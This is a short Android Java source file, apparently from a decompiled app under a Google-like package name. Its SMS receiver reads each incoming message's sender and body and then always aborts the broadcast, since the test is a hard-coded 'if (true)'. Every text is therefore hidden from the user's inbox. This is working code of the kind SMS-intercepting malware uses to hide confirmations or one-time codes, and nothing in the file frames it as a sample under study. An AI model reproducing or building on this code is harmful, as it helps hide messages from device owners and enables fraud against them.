package com.googleprojects.mm;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class JHMsgReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        GJSMSUtil msgUtil = new GJSMSUtil(context);
        SmsMessage[] msgs = msgUtil.getMessageListFromIntent(intent);
        for (SmsMessage msg : msgs) {
            String addr = msg.getOriginatingAddress();
            String msgBody = msg.getMessageBody();
            if (true) {
                abortBroadcast();
            } else {
                msgUtil.addMessageToInbox(msg);
            }
        }
    }
}
